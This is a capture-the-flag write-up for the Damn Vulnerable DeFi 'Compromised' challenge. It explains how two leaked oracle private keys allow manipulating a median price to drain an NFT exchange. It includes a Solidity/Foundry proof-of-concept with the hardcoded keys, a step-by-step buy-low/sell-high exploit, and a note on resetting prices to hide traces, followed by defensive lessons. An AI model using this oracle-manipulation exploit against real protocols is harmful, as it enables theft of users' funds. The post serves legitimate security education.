---
title: 'Damn Vulnerable DeFi - Compromised'
description: 'Oracle manipulation via compromised private keys. Learn how a leak in server logs can lead to complete price control and the systematic draining of an NFT exchange.'
date: 2025-07-29
tags: ['solidity', 'security', 'oracle', 'private-key-leak', 'price-manipulation', 'audit', 'damn-vulnerable-defi','ctf']
image: '../../../../public/damn-vulnerable-defi.png'
authors: ['thesandf']
---

# 📉 Compromised - The Oracle Private Key Leak

## Challenge Overview

A new NFT exchange is live, with prices determined by a `TrustfulOracle`. This oracle relies on a median price reported by three trusted nodes.

**The Catch:** Two leaked hex-encoded strings were found on a web server. 

**The Goal:** Use the leaked information to manipulate the NFT price, buy low, sell high, and drain all ETH from the exchange.

---

## Technical Analysis

### Vulnerability 1: Insufficient Price Risk Management

The `TrustfulOracle` allows trusted nodes to report any price without any bounds or sanity checks:

```solidity
function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
    _setPrice(msg.sender, symbol, newPrice);
}
```

There are no checks for price volatility, maximum/minimum values, or time-weighted averages.

### Vulnerability 2: Small Median Set (Quorum of 2/3)

The oracle calculates the median price from three sources. To control the median, an attacker only needs to control **two out of the three** nodes (a simple majority).

### Vulnerability 3: Blind Trust in Oracles

The exchange contract trusts the oracle's median price absolutely for both buying and selling:

```solidity
uint256 price = oracle.getMedianPrice(token.symbol());
// Exchange uses this 'price' for all logic without verification
```

---

## The Exploit: The Double-Decode Heist

1.  **Extract Keys:** The leaked hex strings are double-encoded (Hex -> Base64). Decoding them reveals the private keys for two of the three oracle nodes.
2.  **Crash the Price:**
    *   Use the compromised keys to call `postPrice(symbol, 0)` from both nodes.
    *   The median price becomes **0**.
3.  **Buy Low:** Purchase an NFT from the exchange for practically nothing.
4.  **Pump the Price:**
    *   Use the same keys to call `postPrice(symbol, exchange_balance)`.
    *   The median price becomes the **entire ETH balance** of the exchange.
5.  **Sell High:** Sell the NFT back to the exchange. The exchange checks the "market price" from the oracle and pays out its entire treasury.
6.  **Cleanup:** Reset the oracle prices to their original values to hide the traces (optional, but good for a "professional" thief).

---

## Proof of Concept (PoC)

```solidity
function test_compromised() public checkSolvedByPlayer {
    // 1. Decoded private keys from the leaks
    uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
    uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

    // 2. Set price to 0 to buy cheap
    vm.prank(vm.addr(pk1));
    oracle.postPrice("DVNFT", 0);
    vm.prank(vm.addr(pk2));
    oracle.postPrice("DVNFT", 0);

    uint256 tokenId = exchange.buyOne{value: 1}();

    // 3. Set price to match pool balance to sell high
    uint256 exchangeBalance = address(exchange).balance;
    vm.prank(vm.addr(pk1));
    oracle.postPrice("DVNFT", exchangeBalance);
    vm.prank(vm.addr(pk2));
    oracle.postPrice("DVNFT", exchangeBalance);

    // 4. Sell and profit
    nft.approve(address(exchange), tokenId);
    exchange.sellOne(tokenId);
    
    // (Final transfer to recovery follows...)
}
```

---

## Auditor's Lessons

1.  **Oracle Security is Infrastructure Security:** Private keys for oracle nodes must be stored in hardware security modules (HSMs) and should never appear in server logs or source code.
2.  **Implement Price Sanity Checks:** Use "Circuit Breakers" that pause the contract if the oracle price fluctuates by more than a certain percentage (e.g., 10%) in a short period.
3.  **TWAP (Time-Weighted Average Price):** Use a TWAP instead of a spot price/median. This forces an attacker to maintain the manipulation over many blocks, making it expensive and highly visible.
4.  **Decentralize Further:** A 3-node oracle with a 2-node quorum is extremely fragile. Real-world protocols like Chainlink use dozens of nodes and decentralized data sources.

---

## Remediation

*   **Volatility Caps:** Revert if `newPrice` is more than 5x different from `oldPrice`.
*   **Heartbeat/Delay:** Require a minimum time between price updates to prevent instant buy/sell loops.
*   **Multi-Source Oracles:** Combine the custom oracle with a battle-tested one like Chainlink to cross-verify prices.
